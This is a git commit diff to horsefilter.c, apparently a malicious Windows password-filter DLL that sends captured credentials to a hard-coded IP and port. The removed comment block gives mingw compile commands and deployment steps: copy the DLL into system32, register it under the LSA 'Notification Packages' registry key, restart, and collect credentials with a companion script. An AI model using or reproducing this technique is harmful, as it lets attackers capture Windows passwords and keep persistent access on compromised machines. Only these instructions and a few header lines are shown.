1881d5188a296233b50f2b8299d485a9a12bb240
joe-7195 <120955388+joe-7195@users.noreply.github.com>
2023-09-18 10:54:27 -0400

    Update horsefilter.c

--- horsefilter.c
+++ horsefilter.c
@@ -1,21 +1,6 @@
 #define DEST_IP "192.168.150.217"
 #define DEST_PORT 80
 
-/* compile with:
-
-x86_64-w64-mingw32-windres horsefilter.rc -o horsefilter.o
-x86_64-w64-mingw32-gcc horsefilter.c horsefilter.o -o horsefilter.dll -shared -lws2_32
-
-*/
-
-// to use:
-// change port and ip macros
-// add compiled dll to system32
-// append dll name (no extension) to
-//     "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages"
-// and restart
-// catch creds with horsefilter.py
-
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
